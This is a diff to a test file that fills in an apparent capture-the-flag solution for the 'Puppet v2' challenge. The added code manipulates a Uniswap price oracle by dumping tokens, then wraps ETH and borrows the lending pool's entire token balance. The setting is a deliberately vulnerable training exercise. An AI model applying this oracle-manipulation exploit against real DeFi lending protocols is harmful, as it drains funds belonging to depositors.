@@ -95,6 +95,30 @@ describe("[Challenge] Puppet v2", function () {
 
     it("Exploit", async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // sell DVT in uniswap first, pump ETH/DVT price
+        await this.token
+            .connect(attacker)
+            .approve(this.uniswapRouter.address, ethers.constants.MaxUint256)
+        await this.uniswapRouter
+            .connect(attacker)
+            .swapExactTokensForTokens(
+                ATTACKER_INITIAL_TOKEN_BALANCE,
+                0,
+                [this.token.address, this.weth.address],
+                attacker.address,
+                ethers.constants.MaxUint256,
+            )
+
+        // weth deposit & approve
+        // deposit amount = (wethRequired - wethCurrentBalance), use calculated result here for the sake of simplicity
+        await this.weth.connect(attacker).deposit({ value: ethers.utils.parseEther("19.6") })
+        await this.weth
+            .connect(attacker)
+            .approve(this.lendingPool.address, ethers.constants.MaxUint256)
+
+        // try to borrow all tokens in the lending pool
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE)
     })
 
     after(async function () {
